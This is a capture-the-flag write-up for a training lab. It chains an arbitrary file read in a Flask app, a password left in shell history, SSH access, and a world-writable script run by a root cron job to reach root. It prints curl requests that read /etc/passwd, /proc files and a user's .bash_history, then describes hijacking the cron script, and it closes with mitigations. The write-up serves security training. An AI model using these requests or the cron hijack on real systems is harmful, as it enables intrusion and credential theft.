1. Overview
Cronpocalypse is a Linux-based Capture The Flag (CTF) lab from HackerDNA focused on web enumeration, arbitrary file reading, SSH access, Linux enumeration, cron jobs, and privilege escalation.
The lab demonstrates how multiple vulnerabilities can be chained together to achieve full system compromise.
The initial foothold was obtained through an Arbitrary File Read vulnerability in a Flask web application. This vulnerability allowed access to sensitive files, including a user's shell history, which exposed credentials for the ctf account.
After obtaining SSH access, local enumeration revealed a root-owned cron job that executed a script located in /tmp. Although the cron job itself was protected, the script it executed was writable by the low-privileged ctf user.
This allowed arbitrary commands to be executed with root privileges.
The overall attack involved:
Web reconnaissance
Arbitrary File Read
Sensitive information disclosure
Credential discovery
SSH access
Linux enumeration
Cron enumeration
Writable root-executed script
Privilege escalation to root

2. Objective
The objective of the lab was to:
Enumerate the target system and identify exposed services.
Identify vulnerabilities in the web application.
Exploit the file-reading functionality to obtain sensitive information.
Obtain access to the ctf user through SSH.
Enumerate the system for privilege escalation opportunities.
Identify an insecure cron configuration.
Exploit the writable script executed by root.
Obtain the root flag.

3. Environment
Platform: HackerDNA
Lab: Cronpocalypse
Target: <TARGET_IP>
Attacker machine: Linux
Target Operating System: Linux / BusyBox-based environment
Web Server: Werkzeug 3.0.6
Application: Python 3.12.9 / Flask
SSH: OpenSSH 9.9
Tools: Nmap, curl, SSH, Linux shell utilities

4. Reconnaissance
The first step was to identify the services exposed by the target.
An Nmap scan was performed against the target:
```bash
nmap -sS -sV <TARGET_IP>
```

The scan identified the following services:
```text
53/tcp   open   domain
22/tcp   open   ssh
80/tcp   open   http
```

The SSH service was identified as:
```text
OpenSSH 9.9
```

The HTTP service revealed:
```text
Werkzeug/3.0.6 Python/3.12.9
```
The web application was identified as FakeCorp.
At this point, the main attack surface consisted of:
```text
HTTP → port 80
SSH  → port 22
DNS  → port 53
```
Since the web application was accessible and exposed several endpoints, further enumeration focused on HTTP.

5. Enumeration
5.1 Web Enumeration
The application contained several accessible pages:
```text
 /about
 /contact
 /features
```

The /features endpoint was particularly interesting because it contained a Read Files functionality.
The relevant HTML was:
```html
<form action="/read" method="get">
    <label for="file">Enter File Path:</label>
    <input type="text" id="file" name="file" placeholder="flag.txt" required>
    <button type="submit">Read</button>
</form>
```

The application therefore accepted a user-controlled parameter named:
file

and sent it to:
```text
/read
```

The page also contained a /random-quote endpoint, but it only returned a static quote and did not provide a useful attack vector.

5.2 Testing the File Reading Function
The /read endpoint was tested against a known system file:
```bash
curl -i "http://<TARGET_IP>/read?file=/etc/hostname"
```

The server returned the internal hostname:
```text
ip-10-0-15-220.eu-west-1.compute.internal
```

This demonstrated that the application was capable of reading files outside its intended web directory.
The /etc/passwd file was then requested:
```bash
curl -i "http://<TARGET_IP>/read?file=/etc/passwd"
```

The response contained several system accounts, including:
```text
root
bin
daemon
sshd
guest
ctf
nobody
```

The ctf account was particularly interesting:
```text
ctf:x:1000:1000:Linux User,,,:/home/ctf:/bin/sh
```

This indicated that a user named ctf existed and had a home directory at:
```text
/home/ctf
```


5.3 Application Process Enumeration
The /proc filesystem was also accessible through the file-reading vulnerability.
The following request was used:
```bash
curl -s "http://<TARGET_IP>/read?file=/proc/self/cmdline"
```

The response revealed:
python3 /opt/webapp/app.py

This identified the location of the application's source code:
```text
/opt/webapp/app.py
```

The application source was then read through the same vulnerability.

5.4 Application Source Code
The relevant portion of the Flask application was:
```python
BLOCKED_FILES = ["flag-user.txt", "flag-root.txt"]

@app.route("/read")
def read_file():
    file = request.args.get("file", "")

    if any(blocked in file for blocked in BLOCKED_FILES):
        return "Access Denied!", 403

    try:
        with open(file, "r") as f:
            return f.read()
```

This confirmed that the value supplied through the file parameter was passed directly to Python's open() function.
The application also attempted to protect the flags using a blacklist:
```python
BLOCKED_FILES = ["flag-user.txt", "flag-root.txt"]
```

However, this only blocked requests containing those specific strings. It did not prevent arbitrary filesystem access.

5.5 /proc Enumeration
Inspecting process environment and status files provided crucial context about the web application's privileges:

```bash
curl -s "http://<TARGET_IP>/read?file=/proc/self/status"
```

The response revealed that the application was running directly as root:

```text
Uid: 0 0 0 0
Gid: 0 0 0 0
```

Because the Flask process was running with root privileges, the file-read vulnerability was not restricted by standard Linux file permissions. This allowed the application to read files in other users' home directories, such as /home/ctf/.bash_history, which would normally be unreadable by a low-privileged web server user.

6. Vulnerability Identification
6.1 Arbitrary File Read
The first major vulnerability was an Arbitrary File Read vulnerability in the /read endpoint.
The application accepted a file path directly from the user:
file = request.args.get("file", "")

and subsequently passed it to:
open(file, "r")

The application did not properly validate or restrict the requested path.
The vulnerable data flow was:
```text
HTTP Request
     ↓
file parameter
     ↓
request.args.get()
     ↓
open(file)
     ↓
File contents returned

This allowed arbitrary files on the system to be read.
```

Examples included:
```text
/etc/passwd
/proc/self/cmdline
/proc/self/environ
/proc/self/status
/home/ctf/.bash_history
```

Why the blacklist failed
The application attempted to prevent access to the flags with:
```python
if any(blocked in file for blocked in BLOCKED_FILES):
```

This was an insecure blacklist approach.
Instead of restricting access to an allowlisted directory or set of files, the application allowed arbitrary paths and attempted to block only two filenames.
The missing security control was proper filesystem path validation and authorization.

6.2 Credential Exposure
The arbitrary file read vulnerability allowed access to:
/home/ctf/.bash_history

The shell history contained commands that exposed the password of the ctf user.
For the public write-up, the actual credential is intentionally omitted.
This created the following chain:
```text
Arbitrary File Read
       ↓
.bash_history
       ↓
Credential Disclosure
       ↓
SSH Access
```


6.3 Insecure Cron Configuration
After gaining SSH access, local enumeration revealed that crond was running as root:
root ... crond -b -L /var/log/cron.log

The root crontab was located under:
/etc/crontabs/root

It contained:
* * * * * /bin/sh /opt/root_cron.sh

This meant that /opt/root_cron.sh was executed by root every minute.
The script contained:
#!/bin/sh
/bin/sh /tmp/backup.sh

The next file in the execution chain was:
/tmp/backup.sh

Its permissions were:
-rwxrw-rw- root root /tmp/backup.sh

The final rw- indicated that other users could write to the file.
Therefore, the ctf user could modify a script that would subsequently be executed by root.

7. Exploitation
7.1 Exploiting Arbitrary File Read
The vulnerability was first confirmed using:
```bash
curl -i "http://<TARGET_IP>/read?file=/etc/hostname"
```

The ability to read /etc/passwd was then confirmed:
```bash
curl -i "http://<TARGET_IP>/read?file=/etc/passwd"
```

The application source code was discovered through:
```bash
curl -s "http://<TARGET_IP>/read?file=/proc/self/cmdline"
```

which revealed:
python3 /opt/webapp/app.py

The source code was then retrieved using:
```bash
curl -s "http://<TARGET_IP>/read?file=/opt/webapp/app.py"
```

This confirmed the vulnerability.

7.2 Obtaining Credentials
After identifying the ctf account, the following file was requested:
```bash
curl -s "http://<TARGET_IP>/read?file=/home/ctf/.bash_history"
```

The shell history contained commands that revealed the ctf user's password.
The credential itself is intentionally omitted from this public write-up.

7.3 SSH Access
The exposed credentials were used to authenticate to SSH:
```bash
ssh ctf@<TARGET_IP>
```

After authentication, the current user was confirmed with:
id

The result showed:
```text
uid=1000(ctf)
gid=1000(ctf)
groups=1000(ctf)
```

This established the initial shell as the low-privileged ctf user.

8. Privilege Escalation
8.1 Initial Privilege Level
The initial SSH shell had:
uid=1000(ctf)

Therefore, the account did not have root privileges.
The goal was to identify a mechanism that could be abused to execute commands as root.

8.2 Process Enumeration
Checking running processes with `ps aux` showed the cron daemon running as root:

root ... crond -b -L /var/log/cron.log

Seeing `crond` active immediately pointed to scheduled tasks as a potential vector for privilege escalation.

8.3 Cron Enumeration
The system used BusyBox:
busybox

The BusyBox cron help indicated that the default crontab directory was:
/var/spool/cron/crontabs

This path was a symlink to:
/etc/crontabs

Listing the directory revealed:
root

The root crontab was then read:
cat /etc/crontabs/root

The result was:
* * * * * /bin/sh /opt/root_cron.sh

This established that root executed /opt/root_cron.sh every minute.

8.4 Following the Script Chain
The contents of /opt/root_cron.sh were:
#!/bin/sh
/bin/sh /tmp/backup.sh

The next step was checking the permissions of /tmp/backup.sh:
```bash
ls -la /tmp/backup.sh
```

The result was:
-rwxrw-rw- root root /tmp/backup.sh

Although the file was owned by root, it was writable by other users.
The original contents were:
#!/bin/sh
tar -czf /tmp/backup.tar.gz /tmp/*.log

Because ctf could modify this file and root's cron job executed it, arbitrary commands could be executed with root privileges.

8.5 Exploiting the Writable Script
The script was temporarily modified so that it executed a command that would provide evidence of the execution context.
Conceptually:
#!/bin/sh
id > /tmp/cron-proof.txt

After the next cron execution, the generated file showed that the command had been executed as:
uid=0(root)

This confirmed successful privilege escalation.
The important part of the exploit was not the individual command itself, but the execution chain:
```text
ctf
 ↓
Modify /tmp/backup.sh
 ↓
root's cron job executes /opt/root_cron.sh
 ↓
/opt/root_cron.sh executes /tmp/backup.sh
 ↓
Attacker-controlled command executes as root
```


8.6 Retrieving the Root Flag
A search for the root flag identified:
/root/flag-root.txt

The ctf user could not directly read this file.
However, the compromised cron execution context was running as root, allowing the contents of the root-only file to be temporarily copied to a location accessible to the ctf user.
The root flag was successfully retrieved.
After exploitation, the modified backup script was restored to its original contents to minimize changes to the lab environment.

9. Proof of Compromise
The privilege escalation was confirmed by obtaining root-level command execution.
The root flag was located at:
/root/flag-root.txt

The actual flag value is intentionally omitted from this public write-up.
Evidence of successful privilege escalation included:
uid=0(root)

This demonstrated that commands controlled by the ctf user were being executed with root privileges.

10. Attack Chain
The complete attack path was:
```text
Reconnaissance
      ↓
Web Enumeration
      ↓
/read Endpoint
      ↓
Arbitrary File Read
      ↓
Read /etc/passwd
      ↓
Identify ctf User
      ↓
Read .bash_history
      ↓
Credential Disclosure
      ↓
SSH Access as ctf
      ↓
Local Enumeration
      ↓
Identify crond Running as root
      ↓
Enumerate /etc/crontabs/root
      ↓
Root Cron Executes /opt/root_cron.sh
      ↓
/opt/root_cron.sh Executes /tmp/backup.sh
      ↓
/tmp/backup.sh Writable by ctf
      ↓
Modify backup.sh
      ↓
Root Executes Attacker-Controlled Command
      ↓
Privilege Escalation
      ↓
/root/flag-root.txt
```


11. Root Cause
The lab contained two primary security mistakes.
Web Application
The application trusted user-controlled filesystem paths and passed them directly to open().
The application attempted to protect sensitive files using a filename blacklist, but this did not prevent arbitrary filesystem access.
The root cause was insufficient authorization and path validation.
Cron Configuration
The privilege escalation was caused by a root-owned scheduled task executing a script that was writable by an unprivileged user.
The critical configuration was:
root cron
    ↓
/opt/root_cron.sh
    ↓
/tmp/backup.sh

while:
/tmp/backup.sh

was writable by ctf.
This violated a fundamental security principle:
A privileged process must never execute code or scripts that can be modified by an unprivileged user.

12. Mitigation
12.1 Fix the Arbitrary File Read
The application should never pass unrestricted user input directly to open().
Instead, it should:
Use an allowlist of permitted files.
Restrict access to a dedicated directory.
Normalize and validate paths.
Prevent path traversal.
Reject absolute paths when unnecessary.
Avoid exposing /proc and other sensitive system files through application functionality.
Run the web application with the minimum privileges required.
A blacklist such as:
```python
BLOCKED_FILES = ["flag-user.txt", "flag-root.txt"]
```

should not be relied upon as the primary security control.

12.2 Protect Credentials
Sensitive credentials should never be stored in shell history.
The exposed password in .bash_history allowed an attacker who obtained file-read access to transition directly into SSH access.
Credentials should instead be:
Stored securely.
Rotated if exposed.
Removed from shell history when accidentally entered.
Protected through appropriate authentication mechanisms.

12.3 Fix the Cron Job
The script executed by root should not be writable by unprivileged users.
For example, a privileged script should be owned by root and have restrictive permissions such as:
root:root
-rwxr-xr-x

The script should also be stored in a protected directory rather than /tmp.
A safer architecture would be:
root cron
    ↓
protected root-owned script
    ↓
controlled commands

instead of:
root cron
    ↓
script in /tmp
    ↓
writable by unprivileged users

The principle of least privilege should also be applied to the cron task itself.

13. Lessons Learned
This lab demonstrated several important penetration-testing concepts.
Web Security
Arbitrary File Read
User-controlled filesystem paths
Blacklist-based security controls
Sensitive information disclosure
/proc filesystem enumeration
Credential exposure through shell history
Linux Security
Linux users and groups
File permissions
Process enumeration
BusyBox
SSH authentication
/tmp permissions
Root-owned processes
Privilege Escalation
Cron enumeration
Crontab analysis
Identifying root-owned scheduled tasks
Detecting writable files executed by privileged processes
Understanding execution chains
Exploiting insecure file permissions
Attack Methodology
The most important lesson from this lab was the importance of chaining vulnerabilities.
The Arbitrary File Read did not immediately provide root access. Instead, it exposed a credential.
That credential provided SSH access.
SSH access allowed local enumeration.
Local enumeration revealed the vulnerable cron configuration.
The cron misconfiguration then allowed arbitrary commands to execute as root.
The final chain was therefore:
Arbitrary File Read
        ↓
Credential Disclosure
        ↓
SSH Access
        ↓
Local Enumeration
        ↓
Insecure Cron Configuration
        ↓
Writable Root-Executed Script
        ↓
Root Command Execution
        ↓
Root Flag

This is an important penetration-testing mindset: a vulnerability does not have to provide full compromise by itself. Multiple weaknesses can be chained together to achieve the final objective.
